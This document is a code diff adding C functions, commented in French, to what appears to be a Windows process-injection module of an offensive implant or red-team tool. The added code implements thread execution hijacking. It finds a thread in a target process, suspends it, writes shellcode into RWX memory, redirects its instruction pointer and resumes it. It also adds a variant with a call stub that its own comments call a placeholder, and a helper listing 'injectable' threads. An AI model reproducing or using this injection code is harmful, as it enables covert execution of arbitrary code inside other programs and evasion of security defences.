@@ -1115,3 +1115,336 @@ PVOID Injection_CallWithSpoofedStack(PVOID function, PVOID arg1, PVOID arg2,
     
     return result;
 }
+
+/* =========================================================================
+ * Thread Execution Hijacking
+ * Détourne un thread existant pour exécuter notre code
+ * ========================================================================= */
+
+/* Typedefs pour les fonctions NT */
+typedef NTSTATUS (NTAPI *pNtGetContextThread)(HANDLE ThreadHandle, PCONTEXT Context);
+typedef NTSTATUS (NTAPI *pNtSetContextThread)(HANDLE ThreadHandle, PCONTEXT Context);
+typedef NTSTATUS (NTAPI *pNtSuspendThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
+
+/*
+ * Trouve un thread injectable dans un processus
+ * Retourne le TID du premier thread trouvé (pas le thread principal si possible)
+ */
+static DWORD FindInjectableThread(DWORD targetPid) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+    
+    THREADENTRY32 te;
+    te.dwSize = sizeof(te);
+    
+    DWORD mainTid = 0;
+    DWORD secondaryTid = 0;
+    
+    if (Thread32First(hSnapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == targetPid) {
+                if (mainTid == 0) {
+                    mainTid = te.th32ThreadID;
+                } else {
+                    secondaryTid = te.th32ThreadID;
+                    break;
+                }
+            }
+        } while (Thread32Next(hSnapshot, &te));
+    }
+    
+    CloseHandle(hSnapshot);
+    
+    /* Préfère un thread secondaire */
+    return secondaryTid ? secondaryTid : mainTid;
+}
+
+/*
+ * Thread Hijacking - détourne un thread existant pour exécuter du shellcode
+ * 
+ * Méthode:
+ * 1. Suspend le thread cible
+ * 2. Sauvegarde son contexte (registres)
+ * 3. Modifie RIP/EIP pour pointer vers notre shellcode
+ * 4. Resume le thread
+ * 5. Le thread exécute notre code puis (optionnellement) restaure le contexte
+ */
+BOOL Injection_ThreadHijack(DWORD targetPid, DWORD targetTid, 
+                            BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    PVOID remoteShellcode = NULL;
+    BOOL success = FALSE;
+    
+    /* Si pas de TID spécifié, trouve un thread */
+    if (targetTid == 0) {
+        targetTid = FindInjectableThread(targetPid);
+        if (targetTid == 0) return FALSE;
+    }
+    
+    /* Ouvre le processus */
+    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid);
+    if (!hProcess) return FALSE;
+    
+    /* Ouvre le thread */
+    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | 
+                         THREAD_SET_CONTEXT, FALSE, targetTid);
+    if (!hThread) goto cleanup;
+    
+    /* Résout les fonctions NT */
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pNtSuspendThread NtSuspendThread = (pNtSuspendThread)GetProcAddress(hNtdll, "NtSuspendThread");
+    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
+    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
+    pNtResumeThread NtResumeThread = (pNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
+    
+    if (!NtSuspendThread || !NtGetContextThread || !NtSetContextThread || !NtResumeThread) {
+        goto cleanup;
+    }
+    
+    /* Suspend le thread */
+    ULONG suspendCount;
+    if (NtSuspendThread(hThread, &suspendCount) != 0) {
+        goto cleanup;
+    }
+    
+    /* Alloue la mémoire pour le shellcode */
+    remoteShellcode = VirtualAllocEx(hProcess, NULL, shellcodeSize + 256,
+                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteShellcode) {
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    /* Écrit le shellcode */
+    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, NULL)) {
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    /* Récupère le contexte du thread */
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    
+    if (NtGetContextThread(hThread, &ctx) != 0) {
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    /* Sauvegarde l'ancien RIP pour potentielle restauration */
+#ifdef _WIN64
+    DWORD64 oldRip = ctx.Rip;
+    ctx.Rip = (DWORD64)remoteShellcode;
+#else
+    DWORD oldEip = ctx.Eip;
+    ctx.Eip = (DWORD)remoteShellcode;
+#endif
+    
+    /* Applique le nouveau contexte */
+    if (NtSetContextThread(hThread, &ctx) != 0) {
+        /* Restaure et resume */
+#ifdef _WIN64
+        ctx.Rip = oldRip;
+#else
+        ctx.Eip = oldEip;
+#endif
+        NtSetContextThread(hThread, &ctx);
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    /* Resume le thread - il exécutera notre shellcode */
+    NtResumeThread(hThread, &suspendCount);
+    
+    success = TRUE;
+    
+cleanup:
+    if (hThread) CloseHandle(hThread);
+    if (hProcess) CloseHandle(hProcess);
+    /* Note: on ne libère pas remoteShellcode car le thread l'utilise */
+    
+    return success;
+}
+
+/*
+ * Thread Hijacking avec restauration automatique du contexte
+ * Le shellcode doit être conçu pour restaurer le contexte après exécution
+ */
+BOOL Injection_ThreadHijackWithRestore(DWORD targetPid, DWORD targetTid,
+                                        BYTE* shellcode, DWORD shellcodeSize) {
+    if (!shellcode || shellcodeSize == 0) return FALSE;
+    
+    HANDLE hProcess = NULL;
+    HANDLE hThread = NULL;
+    PVOID remoteMemory = NULL;
+    BOOL success = FALSE;
+    
+    if (targetTid == 0) {
+        targetTid = FindInjectableThread(targetPid);
+        if (targetTid == 0) return FALSE;
+    }
+    
+    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid);
+    if (!hProcess) return FALSE;
+    
+    hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | 
+                         THREAD_SET_CONTEXT, FALSE, targetTid);
+    if (!hThread) goto cleanup;
+    
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pNtSuspendThread NtSuspendThread = (pNtSuspendThread)GetProcAddress(hNtdll, "NtSuspendThread");
+    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)GetProcAddress(hNtdll, "NtGetContextThread");
+    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)GetProcAddress(hNtdll, "NtSetContextThread");
+    pNtResumeThread NtResumeThread = (pNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");
+    
+    ULONG suspendCount;
+    if (NtSuspendThread(hThread, &suspendCount) != 0) {
+        goto cleanup;
+    }
+    
+    /* Récupère le contexte original */
+    CONTEXT originalCtx;
+    originalCtx.ContextFlags = CONTEXT_FULL;
+    if (NtGetContextThread(hThread, &originalCtx) != 0) {
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    /* Calcule la taille totale nécessaire: 
+     * - Contexte original
+     * - Shellcode de restauration
+     * - Notre shellcode
+     */
+    SIZE_T totalSize = sizeof(CONTEXT) + 256 + shellcodeSize;
+    
+    remoteMemory = VirtualAllocEx(hProcess, NULL, totalSize,
+                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMemory) {
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    /* Layout en mémoire:
+     * [0]                : CONTEXT original
+     * [sizeof(CONTEXT)]  : shellcode de restauration
+     * [sizeof(CONTEXT)+X]: notre shellcode
+     */
+    
+    PBYTE remoteCtx = (PBYTE)remoteMemory;
+    PBYTE remoteRestore = remoteCtx + sizeof(CONTEXT);
+    PBYTE remotePayload = remoteRestore + 128;
+    
+    /* Écrit le contexte original */
+    WriteProcessMemory(hProcess, remoteCtx, &originalCtx, sizeof(CONTEXT), NULL);
+    
+    /* Crée le shellcode de restauration (x64) */
+#ifdef _WIN64
+    BYTE restoreCode[] = {
+        /* call notre shellcode (juste après ce code) */
+        0xE8, 0x00, 0x00, 0x00, 0x00,  /* call +5 (placeholder, sera patché) */
+        /* Après retour, restaure le contexte... */
+        /* Pour simplifier, on fait juste un infinite loop pour l'instant */
+        /* Une vraie implémentation utiliserait NtContinue */
+        0xEB, 0xFE  /* jmp $ (infinite loop placeholder) */
+    };
+    
+    /* Patch le call offset */
+    DWORD callOffset = (DWORD)(remotePayload - (remoteRestore + 5));
+    *(DWORD*)(restoreCode + 1) = callOffset;
+    
+    WriteProcessMemory(hProcess, remoteRestore, restoreCode, sizeof(restoreCode), NULL);
+#else
+    BYTE restoreCode[] = {
+        0xE8, 0x00, 0x00, 0x00, 0x00,  /* call payload */
+        0xEB, 0xFE
+    };
+    DWORD callOffset = (DWORD)(remotePayload - (remoteRestore + 5));
+    *(DWORD*)(restoreCode + 1) = callOffset;
+    
+    WriteProcessMemory(hProcess, remoteRestore, restoreCode, sizeof(restoreCode), NULL);
+#endif
+    
+    /* Écrit notre shellcode */
+    WriteProcessMemory(hProcess, remotePayload, shellcode, shellcodeSize, NULL);
+    
+    /* Modifie le contexte pour exécuter le code de restauration */
+    CONTEXT newCtx = originalCtx;
+#ifdef _WIN64
+    newCtx.Rip = (DWORD64)remoteRestore;
+#else
+    newCtx.Eip = (DWORD)remoteRestore;
+#endif
+    
+    if (NtSetContextThread(hThread, &newCtx) != 0) {
+        NtSetContextThread(hThread, &originalCtx);
+        NtResumeThread(hThread, &suspendCount);
+        goto cleanup;
+    }
+    
+    NtResumeThread(hThread, &suspendCount);
+    success = TRUE;
+    
+cleanup:
+    if (hThread) CloseHandle(hThread);
+    if (hProcess) CloseHandle(hProcess);
+    
+    return success;
+}
+
+/*
+ * Liste les threads d'un processus injectable
+ */
+BOOL Injection_ListThreads(DWORD targetPid, char** outJson) {
+    if (!outJson) return FALSE;
+    
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+    
+    char* json = (char*)malloc(16384);
+    if (!json) {
+        CloseHandle(hSnapshot);
+        return FALSE;
+    }
+    
+    int offset = snprintf(json, 16384,
+        "{\n  \"process_id\": %lu,\n  \"threads\": [\n", targetPid);
+    
+    THREADENTRY32 te;
+    te.dwSize = sizeof(te);
+    
+    int count = 0;
+    BOOL first = TRUE;
+    
+    if (Thread32First(hSnapshot, &te)) {
+        do {
+            if (te.th32OwnerProcessID == targetPid) {
+                /* Essaie d'ouvrir le thread pour vérifier l'accès */
+                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT, 
+                                           FALSE, te.th32ThreadID);
+                BOOL injectable = (hThread != NULL);
+                if (hThread) CloseHandle(hThread);
+                
+                if (!first) {
+                    offset += snprintf(json + offset, 16384 - offset, ",\n");
+                }
+                first = FALSE;
+                
+                offset += snprintf(json + offset, 16384 - offset,
+                    "    {\"tid\": %lu, \"priority\": %ld, \"injectable\": %s}",
+                    te.th32ThreadID, te.tpBasePri, injectable ? "true" : "false");
+                
+                count++;
+            }
+        } while (Thread32Next(hSnapshot, &te) && count < 100);
+    }
+    
+    CloseHandle(hSnapshot);
+    
+    snprintf(json + offset, 16384 - offset,
+        "\n  ],\n  \"thread_count\": %d\n}", count);
+    
+    *outJson = json;
+    return TRUE;
+}
